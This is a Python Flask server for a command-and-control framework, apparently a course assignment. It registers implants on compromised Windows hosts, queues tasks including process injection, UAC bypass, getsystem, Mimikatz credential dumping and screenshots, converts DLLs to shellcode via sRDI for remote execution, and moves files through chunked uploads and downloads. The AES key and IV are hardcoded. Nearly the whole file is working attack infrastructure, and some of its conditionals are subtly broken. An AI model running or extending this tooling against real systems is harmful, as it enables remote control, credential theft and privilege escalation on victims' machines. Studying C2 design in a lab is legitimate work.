from enum import Enum


class taskstatus(Enum):
    Queued = 1
    Pending = 2
    Executing = 3
    Complete = 4
    Failed = 5
    NotSupported = 6

class tasktype(Enum):
    Terminate = 1
    Command = 2
    Pwd = 3
    ChangeDir = 4
    Whoami = 5
    PsList = 6
    Download = 7
    Upload = 8
    ListPrivs = 9
    SetPriv = 10
    RemoteInject = 11
    BypassUAC = 12
    Getsystem = 13
    Screenshot = 14
    Jitter = 15
    Mimikatz = 16
    
class requesttype(Enum):
    Registration = 1
    GetNextTask = 2
    TaskResult = 3
    UploadStart = 4
    UploadChunk = 5
    UploadEnd = 6
    DownloadStart = 7
    DownloadChunk = 8
    DownloadEnd = 9

class processarch(Enum):
    x64 = 1
    x86 = 2


from flask import Flask, jsonify, url_for
from flask_sqlalchemy import SQLAlchemy
from flask import request, make_response, abort

from os import path as os_path
import uuid



app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os_path.join(app.root_path, '..','data.db')
app.app_context().push()
db = SQLAlchemy(app)

# Models
class Agent(db.Model):
    __tablename__ = 'agents'
    id = db.Column(db.String(8), primary_key=True)
    machine_guid = db.Column(db.String)
    hostname = db.Column(db.String)
    username = db.Column(db.String)
    os = db.Column(db.String(1024))
    process_arch = db.Column(db.Integer)
    internal_ip = db.Column(db.String(16))
    external_ip = db.Column(db.String(16))
    integrity = db.Column(db.Integer) # 1-6 https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/integrity-levels
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    tasks = db.relationship("Task", back_populates="agent")

    def __init__(self, machine_guid='', hostname='', username='', os='', process_arch=1, internal_ip='', external_ip='', integrity=3):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.machine_guid = machine_guid
        self.hostname = hostname
        self.username = username
        self.os = os
        self.internal_ip = internal_ip
        self.external_ip = external_ip
        self.process_arch = process_arch
        self.integrity = integrity

    def json(self):
        return { 
            'id': self.id, 
            'machine_guid': self.machine_guid,
            'hostname': self.hostname,
            'username': self.username,
            'internal_ip': self.internal_ip,
            'external_ip': self.external_ip,
            'integrity': self.integrity,
            'process_arch': self.process_arch,
            'os': self.os,
            'created': self.created,
            'updated': self.updated
        }


class DownloadFileChunk(db.Model):
    __tablename__ = 'downloadfilechunks'
    id = db.Column(db.Integer, primary_key=True)
    data = db.Column(db.String)
    downloadfile_id = db.Column(db.String(8), db.ForeignKey('downloadfiles.id'))
    next_chunk_id = db.Column(db.Integer, db.ForeignKey('downloadfilechunks.id'))
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    def __init__(self,data='',downloadfile_id=''):
        self.data = data
        self.type = 2
        self.downloadfile_id = downloadfile_id
    
    def json(self):
        return {
            'id': self.id,
            'data': self.data,
            'downloadfile_id':self.downloadfile_id,
            'created': self.created, 
            'updated': self.updated
        }

class UploadFileChunk(db.Model):
    __tablename__ = 'uploadfilechunks'
    id = db.Column(db.Integer, primary_key=True)
    data = db.Column(db.String)
    uploadfile_id = db.Column(db.String(8), db.ForeignKey('uploadfiles.id'))
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    def __init__(self, data='',uploadfile_id=''):
        self.data = data
        self.type = 1
        self.uploadfile_id = uploadfile_id
    
    def json(self):
        return {
            'id': self.id,
            'data': self.data,
            'uploadfile_id':self.uploadfile_id,
            'created': self.created, 
            'updated': self.updated
        }


class UploadFile(db.Model):
    __tablename__ = 'uploadfiles'
    id = db.Column(db.String(8), primary_key=True)
    srv_path = db.Column(db.String) # location on the server
    path = db.Column(db.String) # location on the host running the implant
    type = db.Column(db.Integer) # 1=upload, # 2=download
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())
    
    task_id = db.Column(db.String(8), db.ForeignKey('tasks.id'))
    
    def __init__(self, srv_path='', path=''):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.srv_path = srv_path
        self.path = path
        self.type = 1

    def json(self):
        return {
            'id': self.id,
            'type': self.type,
            'srv_path': self.srv_path,
            'path': self.path,
            'created': self.created, 
            'updated': self.updated
        }

class DownloadFile(db.Model):
    __tablename__ = 'downloadfiles'
    id = db.Column(db.String(8), primary_key=True)
    path = db.Column(db.String) # location on the host running the implant
    srv_path = db.Column(db.String) # location on the server
    type = db.Column(db.Integer) # 1=upload, # 2=download
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    task_id = db.Column(db.String(8), db.ForeignKey('tasks.id'))

    def __init__(self,srv_path='',path='',user='',host=''):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.srv_path = srv_path
        self.type = 2
        self.path = path

    def json(self):
        return {
            'id': self.id,
            'type': self.type,
            'srv_path': self.srv_path,
            'path': self.path,
            'created': self.created, 
            'updated': self.updated
        }


# type: included in TaskList.txt
# status: 1=queued,2=executing,3=complete,4=error 
class Task(db.Model):
    __tablename__ = 'tasks'
    id = db.Column(db.String(8), primary_key=True)
    type = db.Column(db.Integer)
    status = db.Column(db.Integer)
    input = db.Column(db.String)
    result = db.Column(db.String)
    agent_id = db.Column(db.String(8), db.ForeignKey('agents.id'))
    uploadfile_id = db.Column(db.String(8), db.ForeignKey('uploadfiles.id'))
    downloadfile_id = db.Column(db.String(8), db.ForeignKey('downloadfiles.id'))
    created = db.Column(db.DateTime(timezone=True), server_default=db.func.now())
    updated = db.Column(db.DateTime(timezone=True), server_default=db.func.now(), onupdate=db.func.now())

    agent = db.relationship(Agent,back_populates="tasks")
    
    def __init__(self, status=0, type=0, input='', result='', agent_id=''):
        guid = uuid.uuid4()
        self.id = str(guid)[0:8]
        self.status = status
        self.type = type
        self.input = input
        self.result = result
        self.agent_id = agent_id

    def json(self):
        return { 
            'id': self.id, 
            'type': self.type, 
            'status': self.status,
            'input': self.input, 
            'result': self.result, 
            'agent_id': self.agent_id, 
            'uploadfile_id': self.uploadfile_id,
            'downloadfile_id': self.downloadfile_id,
            'created': self.created, 
            'updated': self.updated
        }


from pprint import pprint
import json
import base64

from os import getcwd
from os import makedirs
from os import path
import os

import shutil
import hashlib
import sys
import time
#changes for hw8
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import binascii
from libs.sRDI.ShellcodeRDI import *



db.create_all()
app.config['DEBUG'] = True

good_ips = ['127.0.0.1']
key_hex = '000102030405060708090A0B0C0D0E0F'
iv_hex = '101112131415161718191A1B1C1D1E1F'

def AESDecrypt(ciphertext):
    try:
        # Convert hex-encoded key and IV strings to bytes
        key = binascii.unhexlify(key_hex)
        iv = binascii.unhexlify(iv_hex)
        # Decode the base64 encoded ciphertext
        ciphertext = base64.b64decode(ciphertext)
        ciphertext = binascii.unhexlify(ciphertext)
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
        decrypted_text = decrypted_data.decode('utf-8')

        return decrypted_text
    except Exception as e:
        print(f"Decryption error: {str(e)}")
        error = str(e)
        return error


#@app.before_request
def restrict_page():
    if request.remote_addr not in good_ips:
        abort(404)  # Not Found

@app.route("/api/send",methods=["POST"])
def send():
    if request.is_json:
        try:
            req = request.get_json()
            b64d = req.get("d")
            decrypted_data = AESDecrypt(b64d)
            json_d = base64.b64decode(decrypted_data).decode('utf-8')
            d = json.loads(json_d)

            if not d['data']:
                return {}
            
            b64data = d['data']
            datastr = base64.b64decode(b64data).decode('utf-8')
            data = json.loads(datastr)
            if d['ht'] == requesttype.Registration.value:
                # agent registration
                os = username = machine_guid = hostname = internal_ip = external_ip = 'unknown'
                ## medium integrity
                integrity = 4
                
                if data['integrity'] >= 1 and data['integrity'] <= 5:
                    integrity = int(data['integrity'])

                process_arch = processarch.x64
                if data['process_arch']:
                    process_arch = data['process_arch']
                
                if data['machine_guid']:
                    machine_guid = data['machine_guid']
                
                if data['hostname']:
                    hostname = data['hostname']
                
                if data['username']:
                    username = data['username']
                
                if data['os']:
                    os = data['os']
            
                if data['internal_ip']:
                    internal_ip = data['internal_ip']
                
                if data['external_ip']:
                    external_ip = data['external_ip']

                myobj = Agent(
                    machine_guid = machine_guid, 
                    hostname = hostname, 
                    username = username,
                    os = os,
                    process_arch = process_arch,
                    internal_ip = internal_ip,
                    external_ip = external_ip,
                    integrity = integrity,
                )
                db.session.add(myobj)
                db.session.commit()
                
                json_data = {
                    "message": "OK",
                    "agent_id": myobj.id
                }

                b64data = base64.urlsafe_b64encode(json.dumps(json_data).encode()).decode()
                response_body = { 'data': b64data }

            elif d['ht'] == requesttype.GetNextTask.value:
                ## get next task
                if not data['agent_id']:
                    return {}

                task = db.session.query(Task).filter(Task.agent_id==data['agent_id'],Task.status==1).order_by(db.asc(Task.updated)).first()
                if task is None:
                    return {}

                if task.type == tasktype.Download.value or task.type == tasktype.RemoteInject.value or task.type == tasktype.ListPrivs.value or task.type ==tasktype.SetPriv.value or task.type ==tasktype.BypassUAC.value or task.type == tasktype.Getsystem.value or task.type == tasktype.Screenshot.value or task.type == tasktype.Mimikatz.value:
                    db_file = db.session.query(DownloadFile).get(task.downloadfile_id)
                    if not db_file:
                       return {}
                    db_file.task_id = task.id
                    if task.type == tasktype.Download.value:
                        task.input = db_file.path
                    
                task.status = taskstatus.Pending.value
                task.updated = db.func.now()
                agent = db.session.query(Agent).get(task.agent_id)
                agent.updated = task.updated
                db.session.commit()

                json_data = {
                        "input": task.input,
                        "type": task.type,
                        "status": task.status,
                        "id": task.id,
                        "agent_id": agent.id
                    }
                
                if task.type == tasktype.Download.value or task.type == tasktype.RemoteInject.value or tasktype.ListPrivs.value or tasktype.SetPriv.value or task.type ==tasktype.BypassUAC.value or task.type == tasktype.Getsystem.value or task.type == tasktype.Screenshot.value or task.type == tasktype.Mimikatz.value:
                    json_data["file_id"] = task.downloadfile_id
                    
                b64data = base64.urlsafe_b64encode(json.dumps(json_data).encode()).decode()
                
                task.status = taskstatus.Executing.value
                db.session.commit()
                response_body = { 'data': b64data }
            elif d['ht'] == requesttype.TaskResult.value:
                ## task result
                pprint(data) 
                task = db.session.query(Task).filter(Task.id==str(data['id']),Task.agent_id==str(data['agent_id'])).first()
                if task is None:
                    print("not task")
                    return {}

                # check if status is: 4=complete|5=failed|6=notsupported
                if int(data['status']) >= 4 and int(data['status']) <= 6: 
                    task.status = int(data['status'])
                else:
                    task.status = taskstatus.Executing.value

                if data['result'] is None:
                    print("not result")
                else:
                    task.result = data['result']
 
                task.updated = db.func.now()
                agent = db.session.query(Agent).get(task.agent_id)
                agent.updated = task.updated
                db.session.commit()

                response_body = {
                    "message": "OK",
                }
            ## upload start
            elif d['ht'] == requesttype.UploadStart.value:
                task = db.session.query(Task).get(data['task_id'])
                if task is None:
                    print("not task")
                    return {}
                if task.type == tasktype.Screenshot.value:
                    epoch_time = time.time()
                    cwdi = getcwd() 
                    ss_path = os_path.join(cwdi, "data\screenshots")
                    data_path = os_path.join(ss_path, f"AGENT-{task.agent_id}_TASK-{task.id}_{epoch_time}.png")
                    print(data_path)
                    try:
                        makedirs(ss_path, exist_ok=True)
                    except OSError as e:
                        print(f"Error creating directory: {e}")
                    db_file = UploadFile(
                    path = data_path
                    )
                else:
                    db_file = UploadFile(
                        path = data['path']
                    )
                db.session.add(db_file)
                db.session.commit()
                task.uploadfile_id = db_file.id
                db.session.commit()
                db_filechunk = UploadFileChunk(
                    data = data['content'],
                    uploadfile_id = db_file.id
                )
                db.session.add(db_filechunk)
                
                agent = db.session.query(Agent).get(task.agent_id)
                agent.updated = task.updated
                db.session.commit()
                response_body = {
                        "message": "OK",
                        "id": str(db_file.id)
                    }
            ## upload chunk              
            elif d['ht'] == requesttype.UploadChunk.value:
                db_filechunk = UploadFileChunk(
                    data = data['content'],
                    uploadfile_id = data['file_id']
                )
                db.session.add(db_filechunk)
                db.session.commit()
                response_body = {
                    "message": "OK",
                }
            ## upload end
            elif d['ht'] == requesttype.UploadEnd.value:
                task = db.session.query(Task).filter(Task.id==str(data['task_id']),Task.agent_id==str(data['agent_id'])).first()
                if task is None:
                    print("not task")
                    return {}

                if data['result'] is None:
                    print("not result")
              
                if data['status'] is None:
                    print("not status")    
                else:
                    task.status = data['status']
                    
                task.result = ""
                task.updated = db.func.now()
                agent = db.session.query(Agent).get(task.agent_id)
                agent.updated = task.updated
                db.session.commit()
    
                db_file = db.session.query(UploadFile).get(task.uploadfile_id)
                if db_file is None:
                    print("db_file doesnt exist")
                    return {}
                try:
                    cwd = getcwd()
                except Exception as e:
                    print(e)
                path = ""
                if task.type == tasktype.Download.value:
                    path = os_path.join(cwd,"data",task.agent_id,"upload")
                elif task.type == tasktype.Upload.value:
                    path = os_path.join(cwd,"data",task.agent_id,"download")
                elif task.type == tasktype.Screenshot.value:
                    path = os_path.join(cwd,"data\screenshots")
                try:
                    makedirs(path, exist_ok=True)    
                except OSError as error:
                    print(error)  
                   
                tmp = db_file.path.split('\\')
                filename = tmp[-1]
                guid = uuid.uuid4()
                myguid = str(guid)[0:8]
                if task.type != tasktype.Screenshot.value:
                    filename = myguid + "-" + filename
                fullpath = os_path.join(path,filename)
                with open(fullpath, 'wb') as fl:
                    result = db.session.query(UploadFileChunk).filter(UploadFileChunk.uploadfile_id == task.uploadfile_id).all()
                    for i in result:
                        fl.write(base64.b64decode(i.data))
                    fl.close()
                
                #https://www.quickprogrammingtips.com/python/how-to-calculate-md5-hash-of-a-file-in-python.html
                md5_hash = hashlib.md5()
                sha256_hash = hashlib.sha256()
                with open(fullpath, 'rb') as f:
                    # Read and update hash in chunks of 4K
                    for byte_block in iter(lambda: f.read(4096),b""):
                        md5_hash.update(byte_block)
                        sha256_hash.update(byte_block)
                   
                result = "file saved to: {}\nMD5:{}\nSHA256:{}\n".format(fullpath,md5_hash.hexdigest(),sha256_hash.hexdigest())
                
                b64result = base64.b64encode(result.encode('utf-8'))
                task.result = b64result.decode('utf-8')
                db.session.commit()
                response_body = {
                    "message": "OK",
                }    
            ## download file          
            elif d['ht'] == requesttype.DownloadStart.value:
                task = db.session.query(Task).get(data['task_id'])
                if task is None:
                    print("not task")
                    return {}
                
                db_file = db.session.query(DownloadFile).get(data['file_id'])
                
                if db_file is None:
                    print("DownloadFile file_id not found")
                    return {}
                
                db_chunks = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).order_by(DownloadFileChunk.id).limit(2)
                total = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).count()
                
                next_chunk_id = 0
                # assign next_chunk only when we have it
                if total > 1:
                    next_chunk_id = db_chunks[0].next_chunk_id
                
                task.downloadfile_id = db_file.id
                agent = db.session.query(Agent).get(task.agent_id)
                agent.updated = task.updated
                db.session.commit()
                    
                response_body = {
                        "message": "OK",
                        "chunk": db_chunks[0].data.decode('ascii'),
                        "next_chunk_id": next_chunk_id,
                        "total": int(total)
                    }    
            ## download chunk          
            elif d['ht'] == requesttype.DownloadChunk.value:
                db_file = db.session.query(DownloadFile).get(data['file_id'])
                if db_file is None:
                    print("DownloadFile file_id not found")
                    return {}
                
                db_filechunk = db.session.query(DownloadFileChunk).get(data['chunk_id'])
                
                total = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).count()
                
                if db_filechunk.next_chunk_id != 0:
                    next_filechunk = db.session.query(DownloadFileChunk).get(db_filechunk.next_chunk_id)
                    if next_filechunk is None:
                        next_chunk_id = 0
                    else:    
                        next_chunk_id = next_filechunk.id
                else:
                    next_chunk_id = 0
                    
                response_body = {
                    "message": "OK",
                    "id": db_filechunk.id,
                    "chunk": db_filechunk.data.decode('ascii'),
                    "next_chunk_id": next_chunk_id,
                    "total": int(total)
                }
            ## download end
            elif d['ht'] == requesttype.DownloadEnd.value:
                
                task = db.session.query(Task).filter(Task.id==data['task_id'],Task.agent_id==data['agent_id']).first()
                if task is None:
                    print("not task")
                    return {}

                #task.downloadfile_id
                db_file = db.session.query(DownloadFile).get(task.downloadfile_id)
                
                ## update status only if we are downloading the file to disk, else we are probably exec'ing with it.
                if task.type == tasktype.Download.value:
                    if data['status'] is None:
                        print("not status")    
                    else:
                        task.status = data['status']
                        task.input = db_file.srv_path + " " + db_file.path
                                        
                task.result = ""
                task.updated = db.func.now()
                agent = db.session.query(Agent).get(task.agent_id)
                db.session.commit()

                response_body = {
                    "message": "OK",
                }         
        except BaseException as e:
            db.session.rollback()
            response_body = {
                "message": "error",
            }
        finally:
            db.session.close()
            
        res = make_response(jsonify(response_body), 200)
        return res
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)
    
@app.route("/admin/api/task",methods=["POST"])
def add_task():
    if request.remote_addr not in good_ips:
        abort(404)

    if request.is_json:
        req = request.get_json()
        b64data = req.get("data")
        json_data = base64.b64decode(b64data).decode('utf-8')
        data = json.loads(json_data)
        pprint(data)

        if not int(data['type']) > 0 or not str(data['agent_id']):
            return {}
        
        print("agent_id")
        print(data['agent_id'])
        print("input:")
        print(data['input'])
        input_path = ""
        
        ## update path on windows for upload task
        if data['type'] == tasktype.Download.value:
            input_path = data['input']
            input_path = input_path.replace('\\','\\')
        else:
            input_path = data['input']
                
        myobj = Task(status=1, type=data['type'], input=str(input_path), result='', agent_id=str(data['agent_id']))
        db.session.add(myobj)
        db.session.commit()

        response_body = {
            "message": "OK",
        }
        res = make_response(jsonify(response_body), 200)
        return res
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)    

@app.route("/admin/api/dropdb",methods=["GET"])
def dropdb():
    if request.remote_addr not in good_ips:
        abort(404)

    db.session.query(DownloadFile).delete()
    db.session.query(UploadFile).delete()
    db.session.query(DownloadFileChunk).delete()
    db.session.query(UploadFileChunk).delete()
    
    db.session.query(Task).delete()
    db.session.query(Agent).delete()
    db.session.commit()

    return {}
    
@app.route("/admin/api/agents",methods=["GET"])
def list_agents():
    if request.remote_addr not in good_ips:
        abort(404)

    agents = db.session.query(Agent).order_by(db.desc(Agent.updated)).all()
    return jsonify([i.json() for i in agents])


@app.route("/admin/api/agent/<id>",methods=["GET"])
def get_agent(id):
    if request.remote_addr not in good_ips:
        abort(404)
    
    agent = db.session.query(Agent).get(id)
    if agent is None:
        return {}

    return jsonify(agent.json())    

@app.route("/admin/api/tasks",methods=["GET"])
def list_tasks():
    if request.remote_addr not in good_ips:
        abort(404)

    tasks = db.session.query(Task).order_by(db.desc(Task.updated)).all()
    return jsonify([i.json() for i in tasks])

@app.route("/admin/api/task/<id>",methods=["GET"])
def get_task(id):
    if request.remote_addr not in good_ips:
        abort(404)

    task = db.session.query(Task).get(id)
    if task is None:
        return {}

    return jsonify(task.json())

@app.route("/admin/api/task/<id>",methods=["PUT"])
def update_task(id):
    if request.remote_addr not in good_ips:
        abort(404)

    task = db.session.query(Task).get(id)
    if task is None:
        return {}

    if request.is_json:
        req = request.get_json()
        b64data = req.get("data")
        json_data = base64.b64decode(b64data).decode('utf-8')
        data = json.loads(json_data)
        
        if data['status']:
            task.status = data['status']
        if data['type']:
            task.type = data['type']
        if data['input']:
           task.input = data['input']
        if data['result']:
            task.result = data['result']
        
        task.updated = db.func.now()
        db.session.commit()
    return jsonify(task.json())

@app.route("/admin/api/agent/<id>",methods=["PUT"])
def update_agent(id):
    if request.remote_addr not in good_ips:
        abort(404)

    agent = db.session.query(Agent).get(id)
    if agent is None:
        return {}

    if request.is_json:
        req = request.get_json()
        b64data = req.get("data")
        json_data = base64.b64decode(b64data).decode('utf-8')
        data = json.loads(json_data)
        if data['machine_guid']:
            agent.machine_guid = data['machine_guid']
        if data['hostname']:
            agent.hostname = data['hostname']
        if data['username']:
            agent.username = data['username']
        if data['os']:
            agent.os = data['os']
        if data['internal_ip']:
            agent.internal_ip = data['internal_ip']
        if data['external_ip']:
            agent.external_ip = data['external_ip']
        if data['integrity']:
            agent.integrity = data['integrity']
        if data['process_arch']:
            agent.process_arch = data['process_arch']
        agent.updated = db.func.now()
        db.session.commit()
    return jsonify(agent.json())

@app.route("/admin/api/agent_task/<agent_id>",methods=["GET"])
def get_agent_task(agent_id):
    if request.remote_addr not in good_ips:
        abort(404)
        
    try:
        result = db.session.query(Task).filter(Task.agent_id==agent_id).order_by(db.desc(Task.updated)).all()
        data = []
        for i in result:
            data.append(i.json())
        
        response_body = data
    except BaseException as e:
        db.session.rollback()
        response_body = {
            "message": "error",
        }
    finally:
        db.session.close()
        
    res = make_response(jsonify(response_body), 200)
    return res    
       
## added for downloading file
@app.route("/admin/api/host_download_file",methods=["POST"])
def host_download_file():
    if request.remote_addr not in good_ips:
        abort(404)

    if request.is_json:
        try:
            req = request.get_json()
            agent_id = req.get("agent_id")
            input_path = req.get("path")
            dst_path = req.get("dst_path")
            
            cwd = os.getcwd()

            filepath = ""
            basename = ""
            path = os_path.join(cwd,"data",agent_id,"download")
            
            if os.name == 'nt':
                basename = input_path.split("\\")[-1]
            else:
                basename = input_path.split("/")[-1]    
                
            filepath = os_path.join(path,basename)

            try:
                os.makedirs(path)
            except OSError as error:
                print(error)    

            shutil.copyfile(input_path, filepath)
            
            db_file = DownloadFile(
                srv_path=filepath,
                path=dst_path
            )
            db.session.add(db_file)
            db.session.commit()

            with open(filepath, 'rb') as fl:
                data = fl.read(1024*1024)
                while data:
                    b64data = base64.b64encode(data)
                    db_filechunk = DownloadFileChunk(
                        data = b64data,
                        downloadfile_id = db_file.id
                    )
                    db.session.add(db_filechunk)
                    db.session.commit()
                    data = fl.read(1024*1024)
            
            db_chunks = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).order_by(DownloadFileChunk.id).all()
            maxlen = len(db_chunks)
            for key,value in enumerate(db_chunks):
                if int(key+1) == maxlen:
                    value.next_chunk_id = 0
                else:
                    value.next_chunk_id = db_chunks[int(key+1)].id
                db.session.commit()
         
                 
            myobj = Task(status=1, type=tasktype.Download.value, input=dst_path, result='', agent_id=agent_id)
            myobj.downloadfile_id = db_file.id
            db.session.add(myobj)
            db.session.commit()
                    
            response_body = {
                "message": "OK",
            }
        except BaseException as e:
            print(e.message)
            db.session.rollback()
            response_body = {
                "message": "error",
            }
        finally:
            db.session.close()
            
        res = make_response(jsonify(response_body), 200)
        return res
        
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)    


## added for downloading file for execution
@app.route("/admin/api/host_download_file_exec",methods=["POST"])
def host_download_file_exec():
    if request.remote_addr not in good_ips:
        abort(404)

    if request.is_json:
        try:
            req = request.get_json()
            agent_id = req.get("agent_id")
            input_path = req.get("path")
            input_args = req.get("input_args")
            input_type = req.get("type")
            
            cwd = os.getcwd()
            guid = uuid.uuid4()
            myguid = str(guid)[0:8]

            filepath = ""
            basename = ""
            path = os_path.join(cwd,"data",agent_id,"download_exec")

            if os.name == 'nt':
                basename = input_path.split("\\")[-1]
            else:
                basename = input_path.split("/")[-1]

            file = "{}-{}".format(myguid,basename)
            filepath = os_path.join(path,file)

            try:
                os.makedirs(path)
            except OSError as error:
                print(error)    

            shutil.copyfile(input_path, filepath)
            if input_type == tasktype.ListPrivs.value or tasktype.SetPriv.value or tasktype.BypassUAC.value or tasktype.Getsystem.value or tasktype.Screenshot.value or tasktype.Mimikatz.value:
                input_dll = filepath
                output_bin = input_dll.replace('.dll', '.bin')
                print('Creating Shellcode: {}'.format(output_bin))
                dll = open(input_dll, 'rb').read()
                flags = 0

                function_name = ""
                converted_dll = ConvertToShellcode(dll, HashFunctionName(function_name), b'None', flags)
                if converted_dll == False:
                    print("Can't convert the DLL")
                    response_body = {"message": "error-can't convert the DLL"}
                    res = make_response(jsonify(response_body), 200)
                    return res
                
                filepath = output_bin
                with open(filepath, 'wb') as f:
                    f.write(converted_dll)
                    
            db_file = DownloadFile(
                srv_path=filepath,
                path=''
            )
            db.session.add(db_file)
            db.session.commit()

            with open(filepath, 'rb') as fl:
                data = fl.read(1024*1024)
                while data:
                    b64data = base64.b64encode(data)
                    db_filechunk = DownloadFileChunk(
                        data = b64data,
                        downloadfile_id = db_file.id
                    )
                    db.session.add(db_filechunk)
                    db.session.commit()
                    data = fl.read(1024*1024)
            
            db_chunks = db.session.query(DownloadFileChunk).filter(DownloadFileChunk.downloadfile_id == db_file.id).order_by(DownloadFileChunk.id).all()
            maxlen = len(db_chunks)
            for key,value in enumerate(db_chunks):
                if int(key+1) == maxlen:
                    value.next_chunk_id = 0
                else:
                    value.next_chunk_id = db_chunks[int(key+1)].id
                db.session.commit()
             
            myobj = Task(status=1, type=input_type, input=input_args, result='', agent_id=agent_id)
            myobj.downloadfile_id = db_file.id
            db.session.add(myobj)
            db.session.commit()
                    
            response_body = {
                "message": "OK",
            }
        except BaseException as e:
            print(e.message)
            db.session.rollback()
            response_body = {
                "message": "error",
            }
        finally:
            db.session.close()
            
        res = make_response(jsonify(response_body), 200)
        return res
        
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)    


## added for making upload files.
@app.route("/admin/api/build_upload_file",methods=["POST"])
def build_upload_file():
    if request.remote_addr not in good_ips:
        abort(404)

    if request.is_json:
        req = request.get_json()
        agent_id = req.get("agent_id")
        task_id = req.get("task_id")
        
        db_task = db.session.query(Task).get(task_id)
        if db_task is None:
            print("db_task doesnt exist")
            return {}
        
        db_file = db.session.query(UploadFile).get(db_task.uploadfile_id)
        if db_file is None:
            print("db_file doesnt exist")
            return {}
        
        cwd = os.getcwd()
        path = os_path.join(cwd,"data",agent_id,"upload")
        filename = ""
        
        guid = uuid.uuid4()
        myguid = str(guid)[0:8]

        if os.name == 'nt':
            filename = db_file.path.split("\\")[-1]
        else:
            filename = db_file.path.split("/")[-1]
        
        filename = "{}-{}".format(myguid,filename)
        filepath = os_path.join(path,filename)
        
        print(path)
        
        try:
            os.makedirs(path)    
        except OSError as error:
            print(error)  

        
        with open(filepath, 'wb') as fl:
            result = db.session.query(UploadFileChunk).filter(UploadFileChunk.uploadfile_id == db_task.uploadfile_id).all()
            for i in result:
                fl.write(base64.b64decode(i.data))
            fl.close()
        
        #https://www.quickprogrammingtips.com/python/how-to-calculate-md5-hash-of-a-file-in-python.html
        md5_hash = hashlib.md5()
        sha256_hash = hashlib.sha256()
        with open(filepath, 'rb') as f:
            # Read and update hash in chunks of 4K
            for byte_block in iter(lambda: f.read(4096),b""):
                md5_hash.update(byte_block)
                sha256_hash.update(byte_block)
                
        response_body = {
            "message": "OK",
            "md5": md5_hash.hexdigest(),
            "sha256": sha256_hash.hexdigest()
        }
        
        res = make_response(jsonify(response_body), 200)
        return res
    else:
        return make_response(jsonify({"message": "Request body must be JSON"}), 400)
       
# function to render index page
@app.route('/test_json')
def test_json():
    return jsonify({"data":"ok"})
 
# function to render index page
@app.route('/')
def index():
    return "ok"
 
if __name__ == '__main__':
    app.run()
    db.create_all()